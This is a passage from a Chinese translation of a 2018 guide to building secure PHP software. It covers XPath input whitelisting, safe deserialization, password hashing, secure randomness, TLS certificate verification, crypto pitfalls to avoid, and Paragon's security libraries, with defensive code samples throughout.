文档外，<a href="https://link.juejin.im/?target=https%3A%2F%2Fwww.owasp.org%2Findex.php%2FXPATH_Injection">XPath注入</a>与 SQL 注入非常相似。</p><p>幸运的是，将用户输入传递给 XPath 查询的情况在 PHP 生态中非常罕见。</p><p>而不幸的是，这也意味着 PHP 生态中不存在可用的最佳避免措施（预编译和参数化 XPath 查询）。最好的办法是在任何涉及 XPath 查询的数据上设置允许使用的字符白名单。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">declare</span>(strict_types=<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SafeXPathEscaper</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> string $input</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> string</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">allowAlphaNumeric</span><span class="params">(string $input)</span>: <span class="title">string</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> \preg_replace(<span class="string">'#[^A-Za-z0-9]#'</span>, <span class="string">''</span>, $input);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> string $input</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> string</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">allowNumeric</span><span class="params">(string $input)</span>: <span class="title">string</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> \preg_replace(<span class="string">'#[^0-9]#'</span>, <span class="string">''</span>, $input);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Usage:</span></span><br><span class="line">$selected = $xml-&gt;xpath(</span><br><span class="line">    <span class="string">"/user/username/"</span> . SafeXPathEscaper::allowAlphaNumeric(</span><br><span class="line">        $_GET[<span class="string">'username'</span>]</span><br><span class="line">    )</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>白名单总会比黑名单更安全。</p><h3 id="反序列化和-PHP-对象注入"><a href="#反序列化和-PHP-对象注入" class="headerlink" title="反序列化和 PHP 对象注入"></a>反序列化和 PHP 对象注入</h3><blockquote><p>深入： <a href="https://link.juejin.im/?target=https%3A%2F%2Fparagonie.com%2Fblog%2F2016%2F04%2Fsecurely-implementing-de-serialization-in-php">在PHP中安全地实现（反）序列化</a></p></blockquote><p>如果你将不可信的数据传递给<code>unserialize()</code>，则通常是这两个结果之一：</p><ul><li>PHP 对象注入，它能用于启动 POP 链（POP chain）并触发其他误用对象的漏洞。</li><li>PHP 解释器本身的内存损坏。</li></ul><p>大多数开发人员更喜欢使用JSON序列化，这是对其软件安全状况的显著改进。但请记住，<a href="https://link.juejin.im/?target=http%3A%2F%2Flukasmartinelli.ch%2Fweb%2F2014%2F11%2F17%2Fphp-dos-attack-revisited.html"><code>json_decode()</code>容易受到散列冲突拒绝服务（Hash-DoS）攻击</a>。不幸的是，<a href="https://link.juejin.im/?target=https%3A%2F%2Fbugs.php.net%2Fbug.php%3Fid%3D70644">PHP的Hash-DOS问题还没有得到彻底解决</a>。</p><p>从<code>djb33</code>迁移到<code>Siphash</code>，对于字符串输入，哈希输出的最高位设置为 1 ，对于整数输入设置为 0 ，使用<code>CSPRNG</code>提供的请求密钥，将完全解决这些攻击。</p><p>不幸的是， PHP 团队还没有准备好放弃他们已经在 PHP 7 系列中取得的性能提升，所以很难说服他们放弃 djb33 （这是非常快但不安全的） 赞成 SipHash （这也是快速的，但不像 djb33 那么快，但更安全）。 如果性能受到重大影响，可能会阻碍未来版本的采用，但也影响了安全性。</p><p>因此，最好的办法是：</p><ul><li><p>使用<code>JSON</code>，因为它比<code>unserialize()</code>更安全。</p></li><li><p>在任何可能的地方，确保输入在反序列化之前被认证。</p><ul><li><p>对于提供给用户的数据，通过一个只有服务器知道的秘钥使用<code>sodium_crypto_auth()</code>和<code>sodium_crypto_auth_verify()</code>验证。</p></li><li><p>对于第三方提供的数据，让他们使用</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sodium_crypto_sign()</span><br></pre></td></tr></table></figure><p>签名他们的 JSON 消息，然后使用</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sodium_crypto_sign_open()</span><br></pre></td></tr></table></figure><p>和第三方公钥验证消息。</p><ul><li>如果你需要对传输的签名进行十六进制或 Base64 位编码，也可以使用分离的签名 API 。</li></ul></li></ul></li><li><p>如果你无法验证 JSON 字符串，请严格限制速度并阻止 IP 地址，以减轻重复的违规者。</p></li></ul><h3 id="密码散列"><a href="#密码散列" class="headerlink" title="密码散列"></a>密码散列</h3><blockquote><p>深入：<a href="https://link.juejin.im/?target=https%3A%2F%2Fparagonie.com%2Fblog%2F2016%2F02%2Fhow-safely-store-password-in-2016">2016 年，如何安全地保存用户密码</a></p></blockquote><p>安全的密码存储曾经是一个激烈争论的话题，但现在实现起来相当微不足道，特别是在 PHP 中：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$hash = \password_hash($password, PASSWORD_DEFAULT);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (\password_verify($password, $hash)) &#123;</span><br><span class="line">    <span class="comment">// Authenticated.</span></span><br><span class="line">    <span class="keyword">if</span> (\password_needs_rehash($hash, PASSWORD_DEFAULT)) &#123;</span><br><span class="line">        <span class="comment">// Rehash, update database.</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>你甚至不需要知道在后台使用什么算法，因为如果你使用最新版本的 PHP ，你也将使用当前最新的技术，用户的密码将会自动进行升级（只要有新的默认算法可用）。</p><p>无论你做什么，都<a href="https://link.juejin.im/?target=https%3A%2F%2Fparagonie.com%2Fblog%2F2016%2F08%2Fon-insecurity-popular-open-source-php-cms-platforms%23wordpress-password-storage">不要做 WordPress 所做的事情</a>。</p><p>从 PHP 5.5 到 7.2 ，默认算法都是 Bcrypt 。在未来，它可能会切换到获得<a href="https://link.juejin.im/?target=https%3A%2F%2Fpassword-hashing.net%2F">密码哈希大赛冠军</a>的 Argon2 。</p><p>如果你以前没有使用<code>password_*</code> API ，那需要迁移遗留哈希，请确保<a href="https://link.juejin.im/?target=https%3A%2F%2Fparagonie.com%2Fblog%2F2016%2F02%2Fhow-safely-store-password-in-2016%23legacy-hashes">以这种方式进行</a>。很多公司搞错了， 最有名的是<a href="https://link.juejin.im/?target=https%3A%2F%2Fwww.theregister.co.uk%2F2016%2F12%2F15%2Fyahoos_password_hash%2F">雅虎</a>。 最近，错误地实施传统哈希升级似乎导致了<a href="https://link.juejin.im/?target=https%3A%2F%2Fobjective-see.com%2Fblog%2Fblog_0x24.html">苹果的iamroot错误</a>。</p><h3 id="通用加密"><a href="#通用加密" class="headerlink" title="通用加密"></a>通用加密</h3><p>这是一些我们详细写了的话题：</p><ul><li><a href="https://link.juejin.im/?target=https%3A%2F%2Fparagonie.com%2Fblog%2F2015%2F05%2Fusing-encryption-and-authentication-correctly">Using Encryption and Authentication Correctly</a> (2015)</li><li>Recommended: <a href="https://link.juejin.im/?target=https%3A%2F%2Fparagonie.com%2Fblog%2F2015%2F11%2Fchoosing-right-cryptography-library-for-your-php-project-guide">Choosing the Right Cryptography Library for your PHP Project: A Guide</a> (2015)</li><li>Recommended: <a href="https://link.juejin.im/?target=https%3A%2F%2Fparagonie.com%2Fblog%2F2015%2F08%2Fyou-wouldnt-base64-a-password-cryptography-decoded">You Wouldn’t Base64 a Password - Cryptography Decoded</a> (2015)</li><li><a href="https://link.juejin.im/?target=https%3A%2F%2Fparagonie.com%2Fblog%2F2017%2F02%2Fcryptographically-secure-php-development">Cryptographically Secure PHP Development</a> (2017)</li><li>Recommended: <a href="https://link.juejin.im/?target=https%3A%2F%2Fparagonie.com%2Fblog%2F2017%2F06%2Flibsodium-quick-reference-quick-comparison-similar-functions-and-which-one-use">Libsodium Quick Reference: Similarly-Named Functions and Their Use-Cases</a> (2017)</li></ul><p>一般来说，你总是希望使用 Sodium cryptography library（libsodium）进行应用层加密。如果你需要支持早于 7.2 的 PHP 版本（像 5.2.4），你可以使用<a href="https://link.juejin.im/?target=https%3A%2F%2Fgithub.com%2Fparagonie%2Fsodium_compat">sodium_compat</a>，基本上可以假设你的用户也是 7.2 。</p><p>在特定情况下，由于严格的算法选择和互操作性，你可能需要不同的库。如有疑问，请咨询密码专家和密码工程师，了解密码选择是否安全（<a href="https://link.juejin.im/?target=https%3A%2F%2Fparagonie.com%2Fservices">这是我们提供的服务之一</a>）。</p><h3 id="随机性"><a href="#随机性" class="headerlink" title="随机性"></a>随机性</h3><blockquote><p>深入：<a href="https://link.juejin.im/?target=https%3A%2F%2Fparagonie.com%2Fblog%2F2015%2F07%2Fhow-safely-generate-random-strings-and-integers-in-php">如何在 PHP 中生成安全的整数和字符串？</a></p></blockquote><p>如果你需要随机数字，请使用<code>random_int()</code>。如果你需要随机字节字符串，请使用<code>random_bytes()</code>。不要使用<code>mt_rand()</code>，<code>rand()</code>或<code>uniqid()</code>。</p><p>如果你需要从秘密种子（secret seed）生成伪随机数（pseudorandom），请使用<a href="https://link.juejin.im/?target=https%3A%2F%2Fgithub.com%2Fparagonie%2Fseedspring">SeedSpring</a>，而不是<code>srand()</code>或<code>mt_srand()</code>。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">use</span> <span class="title">ParagonIE</span>\<span class="title">SeedSpring</span>\<span class="title">SeedSpring</span>;</span><br><span class="line"></span><br><span class="line">$seed = random_bytes(<span class="number">16</span>);</span><br><span class="line">$rng = <span class="keyword">new</span> SeedSpring($seed);</span><br><span class="line"></span><br><span class="line">$data = $rng-&gt;getBytes(<span class="number">1024</span>);</span><br><span class="line">$int = $rng-&gt;getInt(<span class="number">1</span>, <span class="number">100</span>);</span><br></pre></td></tr></table></figure><h3 id="服务器端-HTTPS-请求"><a href="#服务器端-HTTPS-请求" class="headerlink" title="服务器端 HTTPS 请求"></a>服务器端 HTTPS 请求</h3><blockquote><p>确保 TLS 证书验证没有被禁用</p></blockquote><p>随意使用你已经熟悉的任何兼容 PSR-7 的 HTTP 客户端。 我们喜欢 Guzzle ，有些人喜欢直接使用 cURL 。</p><p>无论你最终使用什么，请确保使用的确定性，以<a href="https://link.juejin.im/?target=https%3A%2F%2Fparagonie.com%2Fblog%2F2017%2F10%2Fcertainty-automated-cacert-pem-management-for-php-software">确保始终可以拥有最新的 CACert 软件包</a>，从而允许启用最严格的 TLS 证书验证设置并保护服务器的出站 HTTPS 请求。</p><p>安装 Certainty 很简单：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">composer <span class="keyword">require</span> paragonie/certainty:^<span class="number">1</span></span><br></pre></td></tr></table></figure><p>使用 Certainty 也很简单：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">use</span> <span class="title">ParagonIE</span>\<span class="title">Certainty</span>\<span class="title">RemoteFetch</span>;</span><br><span class="line"></span><br><span class="line">    $latestCACertBundle = (<span class="keyword">new</span> RemoteFetch())-&gt;getLatestBundle();</span><br><span class="line"></span><br><span class="line">    <span class="comment"># cURL users:</span></span><br><span class="line">    $ch = curl_init();</span><br><span class="line">    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, <span class="number">2</span>);</span><br><span class="line">    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, <span class="keyword">true</span>);</span><br><span class="line">    curl_setopt($ch, CURLOPT_CAINFO, $latestCACertBundle-&gt;getFilePath());</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Guzzle users:</span></span><br><span class="line">    <span class="comment">/** <span class="doctag">@var</span> \GuzzleHttp\Client $http */</span></span><br><span class="line">    $repsonse = $http-&gt;get(</span><br><span class="line">        <span class="string">'https://example.com'</span>, </span><br><span class="line">        [</span><br><span class="line">            <span class="string">'verify'</span> =&gt; $latestCACertBundle-&gt;getFilePath()</span><br><span class="line">        ]</span><br><span class="line">    );</span><br></pre></td></tr></table></figure><p>这样可以保护你免受网络服务器与集成的任何第三方 API 之间的中间人攻击。</p><p><strong>我们真的需要 Certainty 吗？</strong></p><p>保护你的系统， Certainty 并不是严格的要求。缺少它并不是什么漏洞。但如果没有 Certainty ，开源软件必须猜测操作系统的 CACert 软件包的存在位置，如果猜测错误，它往往会失败并导致可用性问题。从历史上看，这激励了许多开发人员只是禁用证书验证，以便他们的代码“正常工作”，却没有意识到他们只是将应用程序变成主动攻击。 Certainty 通过将 CACert 捆绑在最新的可预测位置来消除这种激励。 Certainty 还为希望<a href="https://link.juejin.im/?target=https%3A%2F%2Fgithub.com%2Fparagonie%2Fcertainty%2Fblob%2Fmaster%2Fdocs%2Ffeatures%2FLocalCACertBuilder.md">运行自己的内部 CA </a>为企业提供大量的工具。</p><p><strong>谁禁用了证书验证？</strong></p><p>流行的内容管理系统（WordPress，Magento 等 CMS）的插件/扩展开发者！这是我们试图在生态系统层面上解决的一个巨大的问题。 它不是孤立的任何特定的 CMS ，你会发现这些不安全的插件等都是类似的。</p><p>如果使用了类似的 CMS ，请在插件中搜索<code>CURLOPT_SSL_VERIFYPEER</code>和<code>CURLOPT_SSL_VERIFYHOST</code>，你可能会发现有几个将这些值设置为<code>FALSE</code>。</p><h3 id="避免的事情"><a href="#避免的事情" class="headerlink" title="避免的事情"></a>避免的事情</h3><ul><li><a href="https://link.juejin.im/?target=https%3A%2F%2Fparagonie.com%2Fblog%2F2015%2F05%2Fif-you-re-typing-word-mcrypt-into-your-code-you-re-doing-it-wrong">不要使用<code>mcrypt</code></a>。这是一个十多年来没有开发出来的密码学库。如果你遵循我们的 PHP 版本建议，这应该是一个容易避免的错误，因为<code>mcrypt</code>不再被 PHP 7.2 和更新的版本支持。</li><li><a href="https://link.juejin.im/?target=https%3A%2F%2Fparagonie.com%2Fblog%2F2017%2F01%2Fconfiguration-driven-php-security-advice-considered-harmful">配置驱动的安全建议</a>应该大部分地忽略。如果你正在阅读 PHP 安全性指南，并告诉你更改 php.ini 设置而不是编写更好的代码，那么你可能正在阅读过时的建议。关闭窗口并转到一些和<code>register_globals</code>无关的文章上吧。</li><li><a href="https://link.juejin.im/?target=https%3A%2F%2Fparagonie.com%2Fblog%2F2017%2F03%2Fjwt-json-web-tokens-is-bad-standard-that-everyone-should-avoid">不要使用 JOSE（JWT，JWS，JWE）</a>，这是一套互联网标准，它编纂了一系列容易出错的密码设计。尽管由于某种原因，被写入了标准，也吸引了很多传道人。</li><li><a href="https://link.juejin.im/?target=https%3A%2F%2Fparagonie.com%2Fblog%2F2015%2F09%2Fcomprehensive-guide-url-parameter-encryption-in-php">加密 URL 参数</a>是公司常用来模糊元数据的反模式（例如，我们有多少用户？）。 它带来了实施错误的高风险，也造成了错误的安全感。我们在链接的文章中提出了一个更安全的选择。</li><li>除非迫不得已，否则<a href="https://link.juejin.im/?target=https%3A%2F%2Fparagonie.com%2Fblog%2F2016%2F09%2Funtangling-forget-me-knot-secure-account-recovery-made-simple">不要提供“我忘记了我的密码”的功能</a>。 不要讳言：密码重置功能是一个后门。 有一些方法可以实施以抵御合理的威胁模型，但高风险用户应该不被考虑。</li><li><a href="https://link.juejin.im/?target=https%3A%2F%2Fparagonie.com%2Fblog%2F2016%2F12%2Feverything-you-know-about-public-key-encryption-in-php-is-wrong">避免使用 RSA</a>，改用 libsodium 。如果你必须使用 RSA ，请确保指定 OAEP 填充。</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"> openssl_private_decrypt(</span><br><span class="line">    $ciphertext,</span><br><span class="line">    $decrypted, <span class="comment">// Plaintext gets written to this variable upon success,</span></span><br><span class="line">    $privateKey,</span><br><span class="line">    OPENSSL_PKCS1_OAEP_PADDING <span class="comment">// Important: DO NOT OMIT THIS!</span></span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>如果你不得不使用 PKCS＃1 v1.5 填充，那么无论你与哪个集成在一起，几乎肯定会受到 <a href="https://link.juejin.im/?target=https%3A%2F%2Frobotattack.org%2F">ROBOT</a> 的影响，请以允许明文泄露和签名伪造的漏洞将其报告给相应的供应商（或 US-CERT ）。</p><h2 id="专业用法"><a href="#专业用法" class="headerlink" title="专业用法"></a>专业用法</h2><p>现在你已经掌握了在 2018 年及以后构建安全 PHP 应用程序的基础知识，接下来我们来看一些更专业的用法。</p><h3 id="可搜索的加密"><a href="#可搜索的加密" class="headerlink" title="可搜索的加密"></a>可搜索的加密</h3><blockquote><p>深入：<a href="https://link.juejin.im/?target=https%3A%2F%2Fparagonie.com%2Fblog%2F2017%2F05%2Fbuilding-searchable-encrypted-databases-with-php-and-sql">使用PHP和SQL构建可搜索的加密数据库</a></p></blockquote><p>可搜索的加密数据库是可取的，但被广泛认为是不太可能实现的。上面链接的博客文章试图通过改进我们解决方案来实现，但本质上是这样的：</p><ul><li>设计你的架构，以便数据库（database compromise）不会让攻击者访问你的加密密钥。</li><li>用一个密钥加密数据。</li><li>基于 HMAC 或具有静态盐的安全 KDF （secure KDF with a static salt）创建多个索引（具有自己独特的密钥）</li><li>可选：截断步骤3的输出，将其用作布隆过滤器（Bloom filter）</li><li>在 SELECT 查询中使用步骤3或4的输出</li><li>解密结果。</li></ul><p>在这个过程中的任何一步，你都可以根据实际使用情况进行不同的权衡。</p><h3 id="没有-Side-Channels-的基于令牌的身份验证"><a href="#没有-Side-Channels-的基于令牌的身份验证" class="headerlink" title="没有 Side-Channels 的基于令牌的身份验证"></a>没有 Side-Channels 的基于令牌的身份验证</h3><blockquote><p>深入： <a href="https://link.juejin.im/?target=https%3A%2F%2Fparagonie.com%2Fblog%2F2017%2F02%2Fsplit-tokens-token-based-authentication-protocols-without-side-channels">Split Tokens: Token-Based Authentication Protocols without Side-Channels</a></p></blockquote><p>说到数据库（上一节），你是否知道 SELECT 查询理论上可能是定时信息泄漏的来源？</p><p>简单的缓解措施：</p><ul><li>把你的认证令牌分为两半</li><li>一半在 SELECT 查询中使用</li><li>后一半在恒定的时间（constant-time）验证<ul><li>可以选择将后半部分的散列存储在数据库中。这对于只能使用一次的令牌是有意义的，例如 密码重置或“在此计算机上记住我”的令牌</li></ul></li></ul><p>即使可以使用定时泄漏来窃取一半的令牌，剩下的也需要暴力破解才能成功。</p><h3 id="开发安全的API"><a href="#开发安全的API" class="headerlink" title="开发安全的API"></a>开发安全的API</h3><blockquote><p>深入： <a href="https://link.juejin.im/?target=https%3A%2F%2Fparagonie.com%2Fblog%2F2017%2F06%2Fhardening-your-php-powered-apis-with-sapient">Hardening Your PHP-Powered APIs with Sapient</a></p></blockquote><p>我们写了 <a href="https://link.juejin.im/?target=https%3A%2F%2Fgithub.com%2Fparagonie%2Fsapient">SAPIENT</a> （the <strong>S</strong>ecure <strong>API</strong> <strong>EN</strong>gineering <strong>T</strong>oolkit），让服务器到服务器验证的消息传递变得简单易行。除了 HTTPS 提供的安全性之外，<code>Sapient</code>允许你使用共享密钥或公钥来加密和验证消息。 这使得即使存在中间攻击者，并设有流氓证书颁发机构，你也可以使用<code>Ed25519</code>对 API 请求和响应进行身份验证，或者将消息加密到只能由接收方服务器的密钥解密的目标服务器。 由于每个 HTTP 消息体都通过安全密码进行身份验证，所以可以安全地使用它来代替<code>stateful token juggling protocols</code>（例如 OAuth）。但是，在密码学方面，在做任何不规范的事情之前，总要确保他们的实现是由专家研究的。</p><p>所有<code>Sapient</code>使用的密码算法都由<code>Sodium cryptography library</code>提供。</p><p>进一步阅读：</p><ul><li><a href="https://link.juejin.im/?target=https%3A%2F%2Fgithub.com%2Fparagonie%2Fsapient%2Ftree%2Fmaster%2Fdocs">Sapient Documentation</a></li><li><a href="https://link.juejin.im/?target=https%3A%2F%2Fgithub.com%2Fparagonie%2Fsapient%2Fblob%2Fmaster%2Fdocs%2FTutorial.md">Sapient Tutorial</a></li><li><a href="https://link.juejin.im/?target=https%3A%2F%2Fgithub.com%2Fparagonie%2Fsapient%2Fblob%2Fmaster%2Fdocs%2FSpecification.md">Sapient Specification</a></li></ul><p><code>Paragon Initiative Enterprises</code>已经在其许多产品（包括许多开源软件项目）中使用了<code>Sapient</code>， 并将继续添加软件项目到<code>Sapient</code>用户群中。</p><h3 id="使用Chronicle记录安全事件"><a href="#使用Chronicle记录安全事件" class="headerlink" title="使用Chronicle记录安全事件"></a>使用Chronicle记录安全事件</h3><blockquote><p>深入： <a href="https://link.juejin.im/?target=https%3A%2F%2Fparagonie.com%2Fblog%2F2017%2F07%2Fchronicle-will-make-you-question-need-for-blockchain-technology">Chronicle Will Make You Question the Need for Blockchain Technology</a></p></blockquote><p><a href="https://link.juejin.im/?target=https%3A%2F%2Fgithub.com%2Fparagonie%2Fchronicle">Chronicle</a>是一个基于散列链数据结构的仅追加密码分类账（append-only cryptographic ledger），具有很多吸引公司“区块链”技术的属性，而不会过分矫枉过正。</p><p>除了仅追加密码分类账（append-only cryptographic ledger）这个具有创造性的用例之外，<code>Chronicle</code>集成到SIEM中时，也可以十分有亮点，因为你可以将安全关键事件发送到私人<code>Chronicle</code>中，并且它们是不能被改变的。</p><p>如果你的<code>Chronicle</code>设置为将其摘要散列交叉签名到其他<code>Chronicle</code>实例，或者如果有其他实例配置为复制你的<code>Chronicle</code>内容，攻击者就很难篡改你的安全事件日志。</p><p>在<code>Chronicle</code>的帮助下，你可以获得区块链所承诺的弹性特性（resilience），而没有任何隐私，性能或可伸缩性问题。</p><p>要将数据发布到本地<code>Chronicle</code>，你可以使用任何与<a href="https://link.juejin.im/?target=https%3A%2F%2Fparagonie.com%2Fblog%2F2017%2F12%2F2018-guide-building-secure-php-software%23secure-api-sapient">Sapient-compatible API</a>，但最简单的解决方案称为<a href="https://link.juejin.im/?target=https%3A%2F%2Fgithub.com%2Fparagonie%2Fquill">Quill</a>。</p><h2 id="作者的一些话"><a href="#作者的一些话" class="headerlink" title="作者的一些话"></a>作者的一些话</h2><p>一些聪明的读者可能注意到我们引用了很多我们自己的工作，包括博客文章和开源软件。（当然也不仅仅引用了我们自己的工作）</p><p>这绝不是偶然的。</p><p>自从我们在 2015 年初成立以来，一直在编写安全库并参与提高 PHP 生态系统安全性的工作。我们已经涉足了很多领域，而且我们的安全工程师（他们最近推动了更安全的加密技术加入 PHP 核心，就在最近的 PHP 7.2 中）自我担保地说，并不擅长自我炒作，或是对已经做过的工作持续热情。但你很可能没有听说我们多年来开发的工具或库。对于这个，深感抱歉。</p><p>不论如何，我们也不可能成为各方面的先行者，所以我们尽可能地选择与重视公共利益而不是贪图小利的行业专家工作。 这也是为什么浏览器安全的许多章节都参考了 <a href="https://link.juejin.im/?target=https%3A%2F%2Fscotthelme.co.uk%2F">Scott Helme</a> 和他公司的工作，他们在为开发人员提供这些新的安全功能方面具有可访问性和可理解性。</p><p>本指南当然不会是详尽的。编写不安全代码的方法几乎和编写代码的方法一样多。 <strong>安全是一种心态，而不是目的地。</strong> 随着上面所写的一切，以及后面涉及的资源，我们希望这将有助于全世界的开发人员，从今天开始用 PHP 编写安全的软件。</p><h2 id="资源"><a href="#资源" class="headerlink" title="资源"></a>资源</h2><p>如果你已经按照本页上的所有内容进行了操作，并且需要更多内容，则可能会对我们策划的阅读列表感兴趣，以便学习应用程序安全性。</p><p>如果你认为自己编写的代码足够安全，并希望我们从安全工程师的角度对其进行评判，这也是我们为客户提供的服务。</p><p>你如果为一家要进行合规性测试（PCI-DSS，ISO 27001等）的公司工作，可能还想聘请我们公司来审核你的源代码。我们的流程比其他安全咨询公司更适合开发者。</p><p>接下来是 PHP 和信息安全社区提供的资源列表，这些资源帮助互联网更加安全。</p><ul><li><a href="https://link.juejin.im/?target=http%3A%2F%2Fwww.phptherightway.com%2F">PHP: The Right Way</a>：现代 PHP 开发的实用指南，免费在线。</li><li><a href="https://link.juejin.im/?target=https%3A%2F%2Fmozilla.github.io%2Fserver-side-tls%2Fssl-config-generator%2F">Mozilla’s SSL Config Generator</a></li><li><a href="https://link.juejin.im/?target=https%3A%2F%2Fletsencrypt.org%2F">Let’s Encrypt</a>：证书颁发机构，通过提供免费 TLS 证书，为创建更安全的 Internet 做了很多。</li><li><a href="https://link.juejin.im/?target=https%3A%2F%2Fwww.ssllabs.com%2Fssltest">Qualys SSL Labs</a>：为 TLS 配置提供了一个快速而简单的测试套件。几乎每个人都使用这个来解决他们的密码组和证书问题，理由很充分：<strong>It does its job well.</strong></li><li><a href="https://link.juejin.im/?target=https%3A%2F%2Fsecurityheaders.io%2F">Security Headers</a>：可以检验你的网站在使用浏览器安全功能来保护用户方面的表现如何。</li><li><a href="https://link.juejin.im/?target=https%3A%2F%2Freport-uri.com%2F">Report-URI</a>：一个很好的免费资源，提供监控 CSP/HPKP 等安全策略的实时安全报告服务。他们给你一个 Report-URI，你可以传递给你的用户的浏览器，如果有什么事情发生或有人发现 XSS 攻击媒介，他们会投诉Report-URI。 Report-URI 会汇总这些错误，并允许你更好地对这些报告进行疑难解答和分类。</li><li><a href="https://link.juejin.im/?target=https%3A%2F%2Fwww.ripstech.com%2Fphp-security-calendar-2017">PHP Security Advent Calenda</a>：<a href="https://link.juejin.im/?target=https%3A%2F%2Fwww.ripstech.com%2F">RIPSTech</a>旗下的团队负责。</li><li><a href="https://link.juejin.im/?target=https%3A%2F%2Fsnuffleupagus.readthedocs.io%2F">Snuffleupagus</a>：一个面向安全的 PHP 模块（<a href="https://link.juejin.im/?target=https%3A%2F%2Fgithub.com%2Fsektioneins%2Fsuhosin">Suhosin</a>的精神继承者，似乎在很大程度上会被放弃）</li><li><a href="https://link.juejin.im/?target=https%3A%2F%2Fphpdelusions.net%2F">PHP Delusions</a>：一个致力于更好地使用 PHP 的网站。大部分的口吻是非常有见地的，作者对技术的准确性和清晰度的奉献使得值得一读，特别是对于那些不太喜欢 PDO 功能的人来说。</li><li><a href="https://link.juejin.im/?target=https%3A%2F%2Fhaveibeenpwned.com%2F">Have I Been Pwned?</a>：帮助用户发现他们的数据是否属于过时数据泄露。</li></ul><h2 id="结尾"><a href="#结尾" class="headerlink" title="结尾"></a>结尾</h2><p>原文地址：<a href="https://link.juejin.im/?target=https%3A%2F%2Fparagonie.com%2Fblog%2F2017%2F12%2F2018-guide-building-secure-php-software">The 2018 Guide to Building Secure PHP Software - P.I.E. Staff</a></p><p>最早是在Laravel China社区里帖子 - <a href="https://link.juejin.im/?target=https%3A%2F%2Flaravel-china.org%2Ftopics%2F7080%2Fthe-2018-guide-to-building-secure-php-software">The 2018 Guide to Building Secure PHP Software</a>看到，一位同学只发了原链接，由于是全英，文章也比较长，就没有深读，但可以知道这是一篇很好的文章，值得学习，这几天花了时间翻译了全文。</p><p>为避免歧义，部分专业名词和语句保留了原文。翻译过程借助了 Google 和 Google 翻译，本人英文和相关专业水平有限，如有错误感谢指出修正。</p><blockquote><p>翻译版权所有: 癞蛤蟆想吃炖大鹅</p></blockquote><blockquote><p> 版权声明：自由转载-非商用-非衍生-保持署名（<a href="https://creativecommons.org/licenses/by-nc-nd/3.0/deed.zh" target="_blank" rel="noopener">创意共享3.0许可证</a>）</p></blockquote>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;The 2018 Guide to Building Secure PHP Software！&lt;/p&gt;
